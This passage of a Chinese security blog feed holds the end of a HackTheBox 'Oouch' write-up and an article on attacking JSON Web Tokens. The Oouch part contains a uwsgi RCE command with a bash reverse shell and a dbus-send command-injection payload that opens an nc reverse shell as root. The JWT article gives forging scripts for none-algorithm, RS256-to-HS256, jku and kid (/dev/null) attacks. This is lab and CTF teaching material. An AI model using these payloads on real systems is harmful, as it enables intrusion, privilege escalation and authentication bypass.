root</h2><p>ssh登录后先看到目录下有个提示.note.txt</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Implementing an IPS using DBus and iptables &#x3D;&#x3D; Genius?</span><br></pre></td></tr></table></figure><p>Dbus似乎是突破口。但是我的了解仅限于知道Dbus是工控里经常出现的协议。<br>然后linpeas.sh扫一遍。发现没有什么有意思的文件。因为两个python服务都是用docker跑的。<br>同时www-data跑着uwsgi.<br><img src="/2020/07/01/hackthebox-Oouch/11.PNG" alt></p><p>这里首先问题是我们作为非root用户如何进入docker。不然有效信息实在太少了。试了很久发现可以直接用ssh登录进docker???</p><p>当然。只有Flask的docker是可以用ssh登录的。登录进去后先看文件源码。在其中一个找到<br><img src="/2020/07/01/hackthebox-Oouch/12.PNG" alt></p><p>里面提到了Dbus的interface也就是接口。名称叫做<code>htb.oouch.Blcok</code>。并且后面调用了Block方法。</p><p>另一边在oouch本机上找dbus相关配置。在<code>/etc/dbus-1/system.d</code>发现config文件<br><img src="/2020/07/01/hackthebox-Oouch/13.PNG" alt></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span> <span class="comment">&lt;!-- -*- XML -*- --&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">busconfig</span> <span class="meta-keyword">PUBLIC</span></span></span><br><span class="line"><span class="meta"> <span class="meta-string">"-//freedesktop//DTD D-BUS Bus Configuration 1.0//EN"</span></span></span><br><span class="line"><span class="meta"> <span class="meta-string">"http://www.freedesktop.org/standards/dbus/1.0/busconfig.dtd"</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">busconfig</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">policy</span> <span class="attr">user</span>=<span class="string">"root"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">allow</span> <span class="attr">own</span>=<span class="string">"htb.oouch.Block"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">policy</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">policy</span> <span class="attr">user</span>=<span class="string">"www-data"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">allow</span> <span class="attr">send_destination</span>=<span class="string">"htb.oouch.Block"</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">allow</span> <span class="attr">receive_sender</span>=<span class="string">"htb.oouch.Block"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">policy</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">busconfig</span>&gt;</span></span><br></pre></td></tr></table></figure><p>也就是说，root确实是可以利用dbus进行通信的。但只有www-data可以进行收发消息通信。那么下面的要务是获取www-data的权限。</p><p>这里其实并不难。因为我们之前已经发现过，www-data是跑着uwsgi的。而python的uwsgi可以触发RCE似乎在几年前的RWCTF中就出现过。(这是看CTF is awesome 中听到youtuber提到的) </p><p>所以主要就麻烦在把exp传过去。这里使用scp比较方便。因为docker容器里啥都没有.<br>检查下socket文件位置，于是在docker的web源码处找到uwsgi.ini文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">qtc@aeb4525789d8:/code$ cat uwsgi.ini </span><br><span class="line">[uwsgi]</span><br><span class="line">module = oouch:app</span><br><span class="line">uid = www-data</span><br><span class="line">gid = www-data</span><br><span class="line">master = <span class="literal">true</span></span><br><span class="line">processes = 10</span><br><span class="line">socket = /tmp/uwsgi.socket</span><br><span class="line">chmod-sock = 777</span><br><span class="line">vacuum = <span class="literal">true</span></span><br><span class="line">die-on-term = <span class="literal">true</span></span><br></pre></td></tr></table></figure><p><a href="https://github.com/wofeiwo/webcgi-exploits/blob/master/python/uwsgi_exp.py" target="_blank" rel="noopener">https://github.com/wofeiwo/webcgi-exploits/blob/master/python/uwsgi_exp.py</a><br>uwsgi的脚本传好<br>运行脚本，接下来qtc处nc接受即可</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python rce.py  -m unix -u &#x2F;tmp&#x2F;uwsgi.socket -c &quot;bash -c &#39;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;172.18.0.1&#x2F;9001 0&gt;&amp;1&#39;&quot;</span><br></pre></td></tr></table></figure><p><img src="/2020/07/01/hackthebox-Oouch/14.PNG" alt></p><p>这里似乎脚本有个小问题，不过把报错的位置改下就好。</p><p>然后本来应该很快解决的www-data跟root通信问题困扰了我好久。首先传一个nc到docker里面监听，然后用刚刚docker的www-data的shell传下面这个payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dbus-send --system  --print-reply --dest&#x3D;htb.oouch.Block  htb&#x2F;oouch&#x2F;Block  htb.oouch.Block.Block &quot;string:; rm &#x2F;tmp&#x2F;f ; mkfifo &#x2F;tmp&#x2F;f; cat &#x2F;tmp&#x2F;f | &#x2F;bin&#x2F;bash -i 2&gt;&amp;1 | nc 172.18.0.3 6666 &gt;&#x2F;tmp&#x2F;f;&quot;</span><br></pre></td></tr></table></figure><p>按理说应该成的，结果卡了好久。为此特意上网找wp结果发现是几乎一样的payload。加上我又不懂dbus，所以就只好搁置了。结果第二天再试了下就成了……不知道是不是因为我传了个oouch自己的nc到docker里面的缘故。总之太麻烦了，所以不想再复现了。<br><img src="/2020/07/01/hackthebox-Oouch/15.PNG" alt></p><h2 id="summary"><a href="#summary" class="headerlink" title="summary"></a>summary</h2><p>这台靶机主要价值在于前面get user部分非常贴近实战。我觉得是有很高学习价值的。关于oauth的知识之后最好去了解下，对授权这块本应该属于重点的安全问题能有新的认识。</p>]]></content>
      
      
      
        <tags>
            
            <tag> WEB </tag>
            
            <tag> hackthebox </tag>
            
            <tag> pentest </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Make jwt great again</title>
      <link href="2020/06/24/Make-jwt-great-again/"/>
      <url>2020/06/24/Make-jwt-great-again/</url>
      
        <content type="html"><![CDATA[<p>jwt，全称json-web-token.其安全问题一直以来众所周知。CTF中也经常性的会出现相关的jwt伪造的题目。但是之前在打了场NahamconCTF的比赛后，对jwt又有了全新的认识。因此在这里全面的解释下jwt的相关漏洞。Let’s make jwt great again :)</p><a id="more"></a><h2 id="jwt"><a href="#jwt" class="headerlink" title="jwt"></a>jwt</h2><blockquote><p>JWT的全称 Json Web Token。它遵循JSON格式，将用户信息加密到token里，服务器不保存任何用户信息，只保存密钥信息，通过使用特定加密算法验证token，通过token验证用户身份。基于token的身份验证可以替代传统的cookie+session身份验证方法</p></blockquote><p>其格式也非常清晰<br><code>header.payload.signature</code><br>由三段式组成。</p><p>这里值得一提的是，flask的session生成格式也同样是三段式。有一定的异曲同工之处。但是不同于jwt。其伪造方式往往非常局限。</p><p>下面简单谈下三个部分结构</p><ul><li>header<br>一个简单的header是这种形式的<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">        <span class="attr">"alg"</span> : <span class="string">"HS256"</span>,</span><br><span class="line">        <span class="attr">"typ"</span> : <span class="string">"jwt"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><p>但是实际上jwt的header还支持加入其它几个属性。<br><code>kid,jwk......</code><br>其具体含义将在后面提及。</p><ul><li>payload<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"user_role"</span> : <span class="string">"finn"</span>,    <span class="comment">//当前登录用户</span></span><br><span class="line">    <span class="attr">"iss"</span>: <span class="string">"admin"</span>,          <span class="comment">//该JWT的签发者</span></span><br><span class="line">    <span class="attr">"iat"</span>: <span class="number">1573440582</span>,        <span class="comment">//签发时间</span></span><br><span class="line">    <span class="attr">"exp"</span>: <span class="number">1573940267</span>,        <span class="comment">//过期时间</span></span><br><span class="line">    <span class="attr">"nbf"</span>: <span class="number">1573440582</span>,         <span class="comment">//该时间之前不接收处理该Token</span></span><br><span class="line">    <span class="attr">"domain"</span>: <span class="string">"example.com"</span>,   <span class="comment">//面向的用户</span></span><br><span class="line">    <span class="attr">"jti"</span>: <span class="string">"dff4214121e83057655e10bd9751d657"</span>   <span class="comment">//Token唯一标识</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>其中大部分变量都是可以选择性生成的。有的语言的jwt库会自动生成iat变量，但是这些都无伤大雅。往往最重要的，是当payload存储了自定义的敏感信息时。比如username之类的。</li></ul><p>由于jwt存储信息时，header+payload的json数据是直接通过base64进行编码存储的。因此我们一定可以从payload中发现<strong>信息泄露</strong>。</p><p>但是从漏洞利用角度来讲，我们如果想要达成越权的目的，就必须得提到其signature部分。</p><ul><li>Signature</li></ul><p>顾名思义，就是通过前面指定的算法，去生成对应的sig.<br>这里我以HS256为例，从伪代码的角度讲。是这样生成的</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">key = <span class="string">'secretkey'</span>  </span><br><span class="line">unsignedToken = encodeBase64(header) + <span class="string">'.'</span> + encodeBase64(payload)  </span><br><span class="line">signature = HMAC-SHA256(key, unsignedToken)</span><br></pre></td></tr></table></figure><p>可见，其思路就是用<code>HMAC-sha256</code>（对称加密算法），对jwt前两个部分组成的字符串进行加密。</p><p>但是实际上，大家可能注意到过一个现象：jwt中没有<code>/</code>,<code>=</code>这种本该出现在base64数据中的字符。而在之前提到过的比赛中，我也是遇到了这个问题，并通过找规律发现，jwt最终的结果会将原始的base64字符串中的<code>/</code>换成<code>_</code>。并且去掉原本base64中用于补位的<code>=</code>。</p><p>实际上，这点我们可以用python的库中<code>base64.urlsafe_b64encode</code>替换<code>base64encode</code>.也因此可以理解，是为了网络传输才对这几个特殊字符进行了处理。</p><p>至于另一种常见的RS256算法也是相同的道理。服务端需要存储一组<code>publickey.pem</code>与<code>privatekey.pem</code>.我们需要私钥生成token.服务端则会用公钥解密token。</p><h2 id="exploits"><a href="#exploits" class="headerlink" title="exploits"></a>exploits</h2><p>接下来就是如何利用漏洞渗透jwt了。首先需要明确两点</p><ul><li>是否需要利用jwt？</li><li>是否有其他漏洞泄露key?</li></ul><p>之所以提到这两点是因为：jwt本身就是因为只用服务端存储一组key来减轻压力而诞生的。是可以作为sessionid的替换方案的。一般情况下，主流的编程语言python,java,Node.js都可以很轻松的调用jwt.其他语言如php也支持。而真实情况往往是他们调用jwt来存储必要的简单用户信息，所以<strong>不要认为jwt一定有漏洞可利用</strong></p><p>同时，jwt的key也是非常头疼的一个话题。如果需要越权，那么就需要伪造token.而伪造必须需要key来签名（或者服务端脚本漏洞）。也许是受了国赛影响，jwt的key是用<a href="https://github.com/brendan-rius/c-jwt-cracker" target="_blank" rel="noopener">c-jwt-cracker</a>暴破的.而实际情况下，key很有可能难以爆破，所以我认为最佳方案是先去寻找可能泄露key的方法。</p><p>比如某比赛我在getshell后，扒下源码时顺手看了一眼它服务端的key，根本不可能爆破<br><img src="/2020/06/24/Make-jwt-great-again/0.PNG" alt></p><p>所以，<strong>尝试其他方式来获取key</strong>。这也正是我下面要总结的，用于jwt的漏洞利用。</p><h3 id="信息泄露-伪造"><a href="#信息泄露-伪造" class="headerlink" title="信息泄露-伪造"></a>信息泄露-伪造</h3><p>必备网站：<br><a href="http://jwt.io/" target="_blank" rel="noopener">http://jwt.io/</a><br>这也是所有jwt题目第一步就该做的。因为即使没有key，我们也能清晰的得到所有header与payload的信息。而往往这决定了我们下一步的举措。</p><p>比如，payload中有username字段。那么我们是否可以伪造admin来进行权限提升呢？或者，应用有某个变量字段取自jwt,那么我们如果有了key.就可以使用jwt.io或者python脚本进行伪造了。</p><p>以今年网鼎玄武组的js_on为例。当以弱口令登录admin时，就可以得到key。从而任意改造存在sql注入的字段进行盲注。这也就要求我们使用脚本来完成攻击。下面给出一个python调用jwt基本用法</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"></span><br><span class="line">encoded_jwt = jwt.encode(&#123;<span class="string">'user_name'</span>: <span class="string">'admin'</span>&#125;, <span class="string">'secretkey'</span>, algorithm=<span class="string">'HS256'</span>).decode(<span class="string">'utf-8'</span>)</span><br><span class="line">print(encoded_jwt)</span><br></pre></td></tr></table></figure><p>注意python调用jwt的库是<code>PyJwt</code>。并且还有一个坑点是，python想要用私钥作为key，也就是使用RS256算法加密时会报错。不知道是否只有我出现这个问题。因此还是得用<code>jwt.io</code>解决</p><h3 id="None-algorithm"><a href="#None-algorithm" class="headerlink" title="None-algorithm"></a>None-algorithm</h3><p>jwt支持空算法，也就是<code>None</code>。原本只是为了调试用的，但这一旦出现在了源码中将是非常致命的。</p><p>比如之前虎符比赛的题目。应该是借鉴了外国赛的一个题。其源码是这样的</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> sid = <span class="built_in">JSON</span>.parse(Buffer.from(cookie.split(<span class="string">"."</span>)[<span class="number">1</span>], <span class="string">'base64'</span>).toString()).secretid;</span><br><span class="line"><span class="keyword">if</span>(sid==<span class="literal">undefined</span>||sid&gt;=secrets.length||sid&lt;<span class="number">0</span>)&#123;<span class="keyword">throw</span> <span class="string">"invalid sid"</span>&#125;</span><br><span class="line"><span class="keyword">let</span> decoded = jwt.verify(cookie, secrets[sid]);</span><br><span class="line"><span class="keyword">if</span>(decoded.perms==<span class="string">"admin"</span>)&#123;</span><br><span class="line">    res.locals.flag = <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以发现，当没有强调算法，直接使用<code>jwt.verify()</code>时，由于key可控，jwt是可以用None算法来解token的。这也就导致了简单的越权。<br>同理。python的源码如果没有强调，也是存在空算法伪造的。所以有时候不妨尝试一下，看看无算法能不能通过服务端校验（没有源码时）</p><p>通常步骤如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"></span><br><span class="line">jwtToken= <span class="string">'eyJhbGciOiJIUzI1NiIsI...'</span></span><br><span class="line"></span><br><span class="line">decodedToken= jwt.decode(jwtToken, verify=<span class="literal">False</span>)  <span class="comment"># Need to decode the token before encoding with type 'None'</span></span><br><span class="line">noneEncoded= jwt.encode(decodedToken, key=<span class="string">''</span>, algorithm=<span class="literal">None</span>)</span><br><span class="line">print(noneEncoded.decode())</span><br></pre></td></tr></table></figure><h3 id="RS256-to-HS256"><a href="#RS256-to-HS256" class="headerlink" title="RS256 to HS256"></a>RS256 to HS256</h3><p>从非对称到对称算法的伪造。其实非常有意思但是国内CTF都没怎么见到过。</p><p>直接上真题源码，应该是之前HSCTF里面的</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#生成token</span></span><br><span class="line">auth = jwt.encode(&#123;<span class="string">"auth"</span>: <span class="string">"guest"</span>&#125;, PRIVATE_KEY, algorithm=<span class="string">"RS256"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#用token验证身份是否为admin</span></span><br><span class="line">admin = jwt.decode(auth, PUBLIC_KEY)[<span class="string">"auth"</span>] == <span class="string">"admin"</span></span><br></pre></td></tr></table></figure><p>乍一看没什么漏洞。但是如果了解jwt，就会发现这里可能存在使用<code>HS256</code>替换<code>RS256</code>的风险。假如公钥泄露，我们就能用公钥作为key，使用HS256生成token通过校验。这同样是没有强调算法的问题。</p><p>伪造的话可以用python</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line">public = open(<span class="string">'public.pem'</span>, <span class="string">'r'</span>).read()</span><br><span class="line">print(public)</span><br><span class="line">print(jwt.encode(&#123;<span class="string">"data"</span>:<span class="string">"test"</span>&#125;, key=public, algorithm=<span class="string">'HS256'</span>)).decode(<span class="string">'utf-8'</span>)</span><br></pre></td></tr></table></figure><p>但需要注意，这里必须满足pyjwt==0.4.3才能伪造。否则只能采用其他办法了。这里直接给出payloadallthethings里的链接<a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/JSON%20Web%20Token#jwt-signature---rs256-to-hs256" target="_blank" rel="noopener">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/JSON%20Web%20Token#jwt-signature—rs256-to-hs256</a></p><p>而Node.js也存在这种风险。所以说jwt的安全问题主要出在开发者源码写的不够好的原因。</p><h3 id="jku-jwk"><a href="#jku-jwk" class="headerlink" title="jku/jwk"></a>jku/jwk</h3><p>以上都是相对比较常见的漏洞了。甚至国内ctf还只出现过前两种。而Nahamcon的比赛让我了解到了另一种存在的漏洞。与jku相关。</p><blockquote><p>JKU全称是“JWKSet URL”，它是头部的一个可选字段，用于指定链接到一组加密token密钥的URL。若允许使用该字段且不设置限定条件，攻击者就能托管自己的密钥文件，并指定应用程序，用它来认证token。</p></blockquote><p>而jwk就是json web key。</p><p>实际上你能发现amazon就有相关的文档来了解jku。<br><a href="https://docs.aws.amazon.com/zh_cn/cognito/latest/developerguide/amazon-cognito-user-pools-using-tokens-verifying-a-jwt.html" target="_blank" rel="noopener">https://docs.aws.amazon.com/zh_cn/cognito/latest/developerguide/amazon-cognito-user-pools-using-tokens-verifying-a-jwt.html</a></p><p>其中还提到了kid这个header选项。它的作用是获取对应的字段作为key。(jwk类型)</p><p>下面我用比赛中flagjokes这题来讲解下：</p><p>首先解出jwt header如下，而我们只要payload中的username为admin即可获得flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;alg&quot;: &quot;RS256&quot;,</span><br><span class="line">  &quot;jku&quot;: &quot;http:&#x2F;&#x2F;localhost:5000&#x2F;static&#x2F;jwks.json&quot;,</span><br><span class="line">  &quot;kid&quot;: &quot;sqcE1a9gj9p08zNMR1MWbLLvuaPyUeJEsClBhy7Q4Jc&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>jku指向了本地的网页。那么尝试直接访问<br>发现网页存在static/jwks.json</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    &quot;keys&quot;: [</span><br><span class="line">  &#123;</span><br><span class="line">&quot;e&quot;: &quot;AQAB&quot;,</span><br><span class="line">    &quot;kid&quot;: &quot;sqcE1a9gj9p08zNMR1MWbLLvuaPyUeJEsClBhy7Q4Jc&quot;,</span><br><span class="line">    &quot;kty&quot;: &quot;RSA&quot;,</span><br><span class="line">    &quot;n&quot;: &quot;1bVdpTILcGSahuOL6IJCbUpDZTGFHc8lzQORNLQBXDiRd1cC1k5cG41iR1TYh74cp8HYmoLXy4U2bp7GUFm0ip_qzCxcabUwWCxF07TGsmiFmCUbcQ6vbJvnSZSZGe-RFPgHxrVzHgQzepNIY2TmjgXyqt8HNuKBJQ6NoTviyxZUqy65KtSBfLYh5XzFn3FPemOla8kGBu7moSbUpgO1t3m3LgxBV5y51E1xSSoC7nAYPFrQ9wOTHEh7kGxGUQqKtGswyi2ncH22VcfQkxMA0HerFMPOr2n9eEZEbeJFco9Gp3drAYDCyj0QbkJKGdbl_50cimZ7eXgeyc3lEEXL7Q&quot;</span><br><span class="line">&#125;</span><br><span class="line">      </span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此时我发现得到jwk后，即可生成公钥了。但是网站只泄露了公钥，那么根据上面总结的，能尝试的只能是HS256替换RS256生成token.<br>然而当时尝试了后却得到服务端的报错。也就是说并不能更换算法来伪造token.那么怎么办呢？</p><p>此时通过查询一系列资料，终于发现jku的指定是有洞的。假如我们让它加载到我们自己的<code>jwk.json</code>，我们就能够以<code>RS256</code>算法而不是伪造<code>HS256</code>通过校验了。</p><p>所以，正确思路是申请一组key，kid可以自定<br><a href="https://mkjwk.org/" target="_blank" rel="noopener">https://mkjwk.org/</a><br><img src="/2020/06/24/Make-jwt-great-again/1.PNG" alt><br>我们可以只放中间的作为jwk.json，也可以把右边的公钥改成jwk的格式。</p><p>之后就是在线或者用脚本进行jwk-&gt;pem的转换了。这里贴出一个Node.js进行转换的脚本。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> jose = <span class="built_in">require</span>(<span class="string">'node-jose'</span>);</span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> args = process.argv.slice(<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> key = fs.readFileSync(args[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> DUMP_PRIVATE_KEY = (<span class="string">'true'</span> == args[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">jose.JWK.asKey(key)</span><br><span class="line">  .then(<span class="function"><span class="keyword">function</span>(<span class="params">key</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(key.toPEM(DUMP_PRIVATE_KEY));</span><br><span class="line">  &#125;);</span><br></pre></td></tr></table></figure><p>使用时 发现<code>node test.js private.jwk</code>跟 <code>public.jwk</code>一致，证明没有问题。此时只需使用<br><code>node test.js private.jwk TRUE</code>即可输出私钥结果，否则脚本设计上是默认不输出私钥的（危险）。</p><p>因此。本题关键是更改jku获取到我们自己的json。这样我们可以用私钥加密payload.服务端用获取到的公钥解密payload.</p><h3 id="kid-任意文件"><a href="#kid-任意文件" class="headerlink" title="kid-任意文件"></a>kid-任意文件</h3><p>kid的含义上面已经提到过了：指定jwt的密钥。</p><p>kid可能存在的问题，在了解了上面jku的相关漏洞后，应该会比较清楚了。如果jwt是通过header中的kid来获取key，那么就可能造成任意文件读取（不一定有回显）</p><p>简单的情况下，我们可以直接指定kid为2，即HS256的secretkey为2</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"alg"</span> : <span class="string">"HS256"</span>,</span><br><span class="line">    <span class="attr">"typ"</span> : <span class="string">"jwt"</span>,</span><br><span class="line">    <span class="attr">"kid"</span> : <span class="string">"2"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>或者有的时候它是从文件获取的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;kid&quot; : &quot;&#x2F;etc&#x2F;passwd&quot;</span><br></pre></td></tr></table></figure><p>假如有web应用把密钥回显出来（不太可能），即可读取文件。<br>同时还有一种思路。由于可以指定任意文件，只要找到可控的key。我们就能做到伪造jwttoken。</p><p>比如指定静态css文件，它的文件内容一定是可控的，且易于从网页获取的。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;kid&quot; : &quot;&#x2F;css&#x2F;public.css&quot;</span><br></pre></td></tr></table></figure><p>下面就NahamconCTF的B’omarr Style来分析下<br>这题因为花了我不少时间。但是仍然学到了非常多东西，所以特地写下。赛后我也一时兴起写了篇英文wp投CTFTime上了<a href="https://hackmd.io/@byc404/B1VBX8Qp8" target="_blank" rel="noopener">https://hackmd.io/@byc404/B1VBX8Qp8</a><br>下面我相当于补一份中文wp:</p><p>首先是题目注册，登录后的token<br><img src="/2020/06/24/Make-jwt-great-again/2.PNG" alt></p><p>重点同样在于jwt的header</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;typ&quot;: &quot;JWT&quot;,</span><br><span class="line">  &quot;alg&quot;: &quot;HS256&quot;,</span><br><span class="line">  &quot;kid&quot;: &quot;secret.txt&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>从header信息中。我们可以推断出，jwt的key是从secret.txt这个文件中获取的。</p><p>但是非常奇怪的是，在没有key的情况下,<code>jwt.io</code>解出来的payload内容为空。</p><p>这里可能就需要一点眼力了，因为自己做过好几道pickle相关的序列化题，所以这里不难直接看出，jwt的payload部分被替换成了pickle生成的序列化base64内容。或者我们也可以单独拿出这一段奇怪的base64用xxd看<br><img src="/2020/06/24/Make-jwt-great-again/3.PNG" alt></p><p>能够明显看到<code>c_mamin</code>,<code>username</code>等字样。这就是典型的python opcode的内容</p><p>所以这里我明确了题目的要求：伪造一个有效token,包含我们恶意的python序列化内容，进行RCE。</p><p>然而这只是第一步。接下来我们会发现，secret.txt内容未知，而想要获取key并没有其他途径。那么首先我先尝试<code>None</code>算法试试吧。</p><p>尝试后发现只接受HS256.看来重点是，寻找到一个可控的key。</p><p>此处的kid表示我们可以指定任意文件作为密钥，但这也是一大难点。因为此题是python环境，其静态文件基本没有可控的。它的html格式是典型的直接从cdn获取css的<br><img src="/2020/06/24/Make-jwt-great-again/4.PNG" alt><br>而html文件虽然我们能直接获取，但是别忘了这大概率是flask起的web应用。也就是说，我们就算能指定<code>templates/index.html</code>作为key，html中是包含有jinja2的模板语句的，这一部分代码我们也是无法控制的。这里放出扒下来的html<br><img src="/2020/06/24/Make-jwt-great-again/5.PNG" alt></p><p>所以说，静态文件这条路是走不通的。看来只能尝试系统文件了。</p><p>但这里我想大部分人都没想过，linux的系统文件中有什么是内容可控的？这其实也是一个有趣的地方。常见如<code>/etc/passwd</code>，<code>/etc/hosts</code>等等都是无法预测的。而<code>/proc/self</code>等等也许存在空文件但是不能百分之百确定。有没有什么内容是百分之百能够确定的呢？</p><p>有。答案就是<code>/dev/null</code></p><p>我们都知道linux将垃圾内容扔进<code>/dev/null</code>是常见操作。而我们通常是<code>echo log &gt; /dev/null 2&gt;&amp;1</code>来完成一次没有任何回显的直接操作。<code>/dev/null</code>能够丢弃一切写入其中的数据。而读取它将立即得到一个EOF。</p><p>所以说，如果我们控制kid读取<code>/dev/null</code>为key.此时我们直接使用空字符串作为HS256的secretkey就能得到一个有效的key.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"></span><br><span class="line">headers=&#123;</span><br><span class="line">  <span class="string">"typ"</span>: <span class="string">"JWT"</span>,</span><br><span class="line">  <span class="string">"alg"</span>: <span class="string">"HS256"</span>,</span><br><span class="line">  <span class="string">"kid"</span>: <span class="string">"/dev/null"</span></span><br><span class="line">&#125;</span><br><span class="line">payload=&#123;&#125;</span><br><span class="line">token=jwt.encode(payload,<span class="string">''</span>,algorithm=<span class="string">"HS256"</span>,headers=headers).decode(<span class="string">'utf-8'</span>)</span><br><span 